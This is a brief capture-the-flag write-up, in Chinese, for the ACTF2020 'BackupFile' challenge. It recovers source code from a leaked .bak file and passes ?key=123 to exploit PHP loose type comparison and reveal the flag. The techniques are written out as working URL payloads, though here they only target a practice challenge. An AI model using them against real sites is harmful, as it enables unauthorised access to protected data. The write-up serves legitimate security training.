# [ACTF2020 新生赛]BackupFile

1. 页面提示

   Try to find out source file!

2. 根据提示直接访问 */index.php.bak* 得到源代码

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```



3. 代码审计

- 需要传入GET参数key
- key 需要经过`is_numeric`函数校验
- `$key == $str`



4. 构造 payload

存在 PHP 弱类型比较，直接传入123，get flag!

```
/index.php?key=123
/index.php?key=123e0
```

